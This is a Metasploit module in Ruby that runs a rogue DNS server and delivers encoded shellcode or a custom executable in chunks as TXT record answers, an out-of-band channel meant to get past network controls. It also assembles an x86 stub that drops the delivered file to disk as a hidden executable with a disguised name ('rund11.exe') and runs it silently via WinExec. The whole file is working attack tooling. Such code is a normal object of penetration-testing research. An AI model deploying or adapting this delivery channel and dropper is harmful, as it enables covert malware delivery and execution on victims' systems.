##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
# http://metasploit.com/
##


require 'msf/core'
require 'resolv'


class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking

    include Msf::Exploit::Remote::Capture
    include Msf::Auxiliary::Report


    def initialize
        super(
            'Name'        => 'DNS Payload Delivery Service',
            'Version'     => '$Revision$',
            'Description'    => %q{
                This module is designed for out-of-band payload delivery.
                When started this module will create an DNS listener that monitors incoming DNS
                requests for a specified domain. Once a request is received the module will then
                encode the chosen payload and deliver it back to the source of the request as a
                DNS response. Larger payloads will be split amongst a number of sub-domains to keep
                within the size limits of UDP DNS reponses.

                A client-side script of application is required to make use of this module.
                The server-side portion is made available to allow further research into
                alternative shellcode delivery mechanisms.
            },
            'Author'    =>
                [
                    'Chris John Riley',
                    'corelanc0d3r <peter.ve[at]corelan.be>'
                ],
            'License'     => MSF_LICENSE,
            'References'    =>
                [
                    # general
                    ['URL', 'http://blog.c22.cc']
                ],
            'Payload'        =>
                    {
                            'BadChars'    => '',
                            'DisableNops' => true,
                            'EncoderType'    => Msf::Encoder::Type::AlphanumMixed,
                            'EncoderOptions' =>
                                      {
                                        'BufferRegister' => 'EDI',
                                      }
                    },
            'Platform'       => [ 'win', 'linux', 'solaris', 'unix', 'osx', 'bsd', 'php', 'java' ],
            'Arch'           => ARCH_ALL,
            'Targets'        => [ [ 'Wildcard Target', { } ] ],
            'DefaultTarget'  => 0
        )

        register_options(
            [
                OptAddress.new('SRVHOST',   [ true, 'The local host to listen on.', '0.0.0.0' ]),
                OptPort.new('SRVPORT',      [ true, 'The local port to listen on.', 53 ]),
                OptString.new('DOMAIN',     [ true, 'The domain name to resolve (sub-domains will monitored)', '*' ]),
                OptString.new('SubDomainNaming', [true, 'Naming convention for sub-domains (HEX, ALPHA, NUM)', 'ALPHA']),
                OptString.new('ENCODING',   [ true, 'Specify alphanum/base32/base64 encoding', 'alphanum' ]),
                OptString.new('PREFIX',     [ false, 'Prepend value to shellcode delivery', '' ]),
                OptBool.new('PREFIX_NUM',   [ false, 'Assign numbers after prefix', false]),
                OptString.new('CUSTOM_EXE',     [ false, 'Custom EXE to encode']),
            ], self.class)

        register_advanced_options(
            [
                OptBool.new('ExitOnSession', [ false, 'Return from the exploit after a session has been created', true ]),
                OptBool.new('ALLOW_PASSTHRU', [true, 'Allow A record requests to be passed on to be resolved', true]),
                OptInt.new('DNSTTL', [true, 'Custom DNS TTL to use on replies', 0]),
                OptString.new('RemoteExeName',     [ false, 'Use a custom name for remote EXE', 'rund11.exe' ]),
                OptString.new('CustomEXITFUNC',    [ false, 'Set exitfunction for custom EXE', 'PROCESS' ]),
            ], self.class)

        deregister_options('SNAPLEN','FILTER','PCAPFILE','RHOST','UDP_SECRET','GATEWAY','NETMASK', 'TIMEOUT')
    end


    def setup
        # disable handler if using custom EXE
        if datastore['CUSTOM_EXE']
            print_status("#{name}: Disabling payload handler for custom EXE")
            datastore['DisablePayloadHandler'] = true
        end
        super
    end

    def exploit

        if not datastore['ExitOnSession'] and not job_id
            raise RuntimeError, "#{name}: Setting ExitOnSession to false requires running as a job (exploit -j)"
        end

        begin
            @port = datastore['SRVPORT'].to_i
            @host = datastore['SRVHOST']

            @domain = datastore['DOMAIN']
            @custom_exe = datastore['CUSTOM_EXE']
            if @custom_exe
                @sdnaming = 'NUM' # force numbering
            else
                @sdnaming = datastore['SubDomainNaming'].upcase
            end
            @prefix = datastore['PREFIX']
            @prefix_num = datastore['PREFIX_NUM']
            @encoding = datastore['ENCODING'].downcase
            @ttl = datastore['DNSTTL'].to_i || 0
            @prev_hname = -1

            print_status("#{name}: Monitoring requests for subdomains of %s" % @domain)
            # create and split up payload
            preppayload

            # start listner
            print_status("#{name}: Starting DNS Server on %s:%s" % [@host, @port])
            dnslistener

        rescue  =>  ex
            print_error(ex.message)
        ensure
            print_status("#{name}: Stopping DNS Server on %s:%s" % [@host, @port])
        end
    end

    def dnslistener
        # start listner on UDP 53

        # MacOS X workaround
        ::Socket.do_not_reverse_lookup = true

        @sock = ::UDPSocket.new()
        @sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
        @sock.bind(@host, @port)

        print_status("#{name}: DNS server started")
        dnsreply = false

        begin
            while true
                packet, addr = @sock.recvfrom(65535)
                break if packet.length == 0

                request = Resolv::DNS::Message.decode(packet)
                @answer = Resolv::DNS::Message::new(request.id)
                @answer.qr = 1
                @answer.aa = 1
                @answer.opcode = request.opcode
                @answer.rd = request.rd
                @answer.ra = 0
                @answer.rcode = 0
                ttl = @ttl

                request.each_question do |hname, typeclass|
                    dnsreply = false
                    @hname = hname.to_s
                    @record_type = typeclass.name.split("::").last

                    vprint_status("DNS: #{addr[3]}:#{addr[1]} ID: #{request.id} HOSTNAME: #{@hname} TYPE: #{@record_type}")

                    case @record_type
                    when 'TXT'
                        if @domain == "*" or @hname.include?(@domain)
                            if @custom_exe
                                if @hname.split('.').first.to_s.upcase == @prev_hname
                                    subdomain = @last_delivered_segment # repeat previous
                            else
                                    @last_delivered_segment = @last_delivered_segment + 1 # set next segment
                                     subdomain = @last_delivered_segment
                            end

                            else
                                subdomain = @hname.split('.').first.to_s.upcase
                            end
                            if @enc_payload["#{subdomain}"]
                                print_status("#{name}: Preparing answer with %d bytes of data" % @enc_payload["#{subdomain}"].length)
                                @answer.add_answer(@hname + ".", ttl, Resolv::DNS::Resource::IN::TXT.new(@enc_payload["#{subdomain}"]))
                                @answer.encode
                                print_good("#{name}: Delivering payload section %s via #{@record_type.to_s} record answer to #{@hname}" % subdomain)
                                dnsreply = true
                            else
                                if subdomain == -1 and @custom_exe
                                    print_error("#{name}: Received duplicate payload request from %s" % addr[3])
                                else
                                    print_error("#{name}: Received request for payload segment (%s) that doesn't exist" % subdomain)
                                end
                            end
                        else
                            vprint_status("Ignoring request for %s as it's not in scope (*.%s)" % [@hname, @domain])
                        end
                    when 'A'
                        # pass thu lookup to another DNS server
                        if datastore['ALLOW_PASSTHRU']
                            resolv = pass_thru_lookup
                            dnsreply = true if not resolv == 0
                        else
                            next
                        end
                    else
                        print_error("#{name}: Unsupported record type %s" % @record_type)
                    end
                end

                if dnsreply
                    @sock.send(@answer.encode, 0, addr[3], addr[1])
                    @prev_hname = @hname.split('.').first.to_s.upcase # record previous name incase in duplicate requests (Custom EXE)
                end
            end

        rescue ::Exception => e
            print_error("#{name}: #{e.class} #{e}")
        ensure
            # Make sure the socket gets closed on exit
            @sock.close
        end
    end

    def pass_thru_lookup
        # allow A records to be resolved via passthru

        vprint_debug("#{name}: Passing #{@hname} on to be resolved")

        begin
            ip = Resolv::DNS.new().getaddress(@hname).to_s
            resolv = Resolv::DNS::Resource::IN::A.new( ip )
            vprint_debug("#{name}: DNS bypass domain #{@hname} resolved #{ip}")
            @answer.add_answer(@hname, 60, resolv)
            @answer.encode
        rescue
            vprint_debug("#{name}: DNS bypass domain #{@hname} unable to resolve")
            resolv = 0
        end
        return resolv
    end

    def encodepayload
        # encode payload into Base64/Base32 if required

        if @custom_exe

            if ::File.file?(@custom_exe) and ::File.readable?(@custom_exe)
                read_from_file
                p = @payload_contents
            else
                raise "Unable to read from #{@PAYLOAD}"
                return
            end
        else
            # get raw payload
            p = payload.raw
        end

        if @encoding =~ /64$/
            enc_payload = Rex::Text.encode_base64(p)
            print_status("#{name}: Encoding payload using base64")
            return enc_payload
        elsif @encoding =~ /32$/
            enc_payload = Rex::Text.encode_base32(p)
            print_status("#{name}: Encoding payload using base32")
            return enc_payload
        elsif @encoding =~ /^alpha/i
            if @custom_exe
                enc_payload = encode_custom_alpha
            else
                #no further encoding required
                enc_payload = p
            end
            return enc_payload
        else
            raise RuntimeError , "Invalid encoding type"
        end
    end

    def read_from_file
        print_status("Reading custom EXE from #{@custom_exe}")
        file = File.open(@custom_exe, "rb")
        @payload_contents = file.read
        prepstub
        @payload_contents = @stub + @payload_contents
        return
    end

    def prepstub
        #corelanc0d3r

        remote_exename = datastore['RemoteExeName']
        exesize = @payload_contents.length

        exitfuncs = {
                "PROCESS"   => 0x56A2B5F0,    #kernel32.dll!ExitProcess
                "THREAD"    => 0x0A2A1DE0,    #kernel32.dll!ExitThread
                "SEH"       => 0x00000000,    #we don't care
                "NONE"      => 0x00000000    #we don't care
                }

        exitfunc = datastore['CustomEXITFUNC'].upcase
        exitasm = ""

        if exitfuncs[exitfunc]
            exitasm = case exitfunc
                when "SEH" then "xor eax,eax\ncall eax"
                when "NONE" then "jmp end"    # don't want to load user32.dll for GetLastError
                else "push 0x0\npush 0x%x\ncall ebp" % exitfuncs[exitfunc]
            end
        end

        stub_asm = <<EOS
; This custom routine will save the original .exe from heap to file
; and execute it
; corelanc0d3r

    jmp get_filename
get_filename_return:
; create file, return handle
    pop esi        ; ptr to filename
    push eax    ; hTemplateFile
    push 2        ; dwFlagsAndAttributes (Hidden)
    push 2        ; dwCreationDisposition (CREATE_ALWAYS)
    push 0        ; lpSecurityAttributes
    push 2        ; dwShareMode
    push 2        ; dwDesiredAccess
    push esi    ; lpFileName
    push 0x4FDAF6DA    ; kernel32.dll!CreateFileA
    call ebp
    xchg eax,ebx    ; save handle in ebx

write_to_file:
    push 0            ; lpOverLapped
    push esp        ; lpNumberOfBytesWritten
    push #{exesize}        ; nNumberOfBytesToWrite
    jmp get_start_of_exe
get_start_of_exe_return:    ; will leave lpBuffer on stack
    push ebx        ; hFile
    push 0x5BAE572D        ; kernel32.dll!WriteFile
    call ebp

close_handle:
    push ebx    ; handle
    push 0x528796C6    ; kernel32.dll!CloseHandle
    call ebp

execute_file:
    push 0        ; don't show
    push esi    ; lpCmdLine
    push 0x876F8B31    ; kernel32.dll!WinExec
    call ebp

thats_all_folks:
    #{exitasm}

get_filename:
    call get_filename_return
    db "#{remote_exename}",0x00

get_start_of_exe:
    call get_start_of_exe_return
; exe starts here
EOS

        @stub = Metasm::Shellcode.assemble(Metasm::Ia32.new, stub_asm).encode_string

        print_status("'Save to file & run' stub created, %d bytes in length" % @stub.length)
    end

    def preppayload
        # split into chunks for delivery

        if @prefix_num
            payload_modifier = 2 # make room for numbering scheme
        else
            payload_modifier = 0
        end
        payload_size = 255 - @prefix.length - payload_modifier.to_i
        tosplit = encodepayload
        @split_payload = []
        start = 0
        while start < tosplit.length
            @split_payload << tosplit[start..start+payload_size-1]
            start = start + payload_size
        end
        print_status("#{name}: Splitting payload into %d chunks" % @split_payload.length)
        listening_on = []
        @enc_payload = Hash.new
        if @prefix_num
            pnum = 0
            i = 1
            @split_payload.each do | epay |
                val = subdomainnaming(i)
                listening_on << val
                @enc_payload["#{val}"] = @prefix.to_s + pnum.to_s + epay
                pnum = pnum+1
                i = i +1
            end
        else
            i = 1
            @split_payload.each do | epay |
                val = subdomainnaming(i)
                listening_on << val
                @enc_payload["#{val}"] = @prefix.to_s + epay
                i = i +1
            end
        end

        if datastore['VERBOSE']
            i = 1
            @enc_payload.each do | shellcode |
                vprint_debug("#{name}: Split payload (Section %d, %d bytes in size) ::: \n%s" % [i, shellcode.length, shellcode])
                i = i +1
            end
        end

        if @custom_exe
            print_status("#{name}: Delivery of payload segments in order - regardless of sub-domain requested")
            @last_delivered_segment = 0 # set counter for delivered segments to 0
        else
            print_status("#{name}: Listening for requests on {%s}.%s" % [listening_on.join(",").to_s, @domain.upcase])
        end
    end

    def encode_custom_alpha

        print_status("Encoding %d bytes. This process may take some time..." % @payload_contents.length)

        # Encode with alpha_mixed
        enc = framework.encoders.create('x86/alpha_mixed')
        enc.datastore.import_options_from_hash({ 'BufferRegister' => 'EDI' })
        plat = Msf::Module::PlatformList.transform('win')
        enc_payload = enc.encode(@payload_contents, nil, nil, plat)

        print_status("Encoding complete - %d bytes in length" % enc_payload.length)
        return enc_payload
    end

    def subdomainnaming(i)
        # assign sub-domains based on chosen naming convention (01,02,03...FF : A,B,C...Z : 1,2,3...255)

        case @sdnaming
        when 'HEX'
            val = i.to_s(16).to_s.rjust(2, '0').upcase
        when 'ALPHA'
            if i < 27
                val = (i + 64).chr
            else
                raise RuntimeError, "#{name}: Too many payload sections to use ALPHA naming for sub-domains"
            end
        when 'NUM'
            val = i.to_s
        else
            raise RuntimeError, "#{name}: Unknown Sub-Domain naming convention %s" % @sdnaming
        end
        return val
    end
end
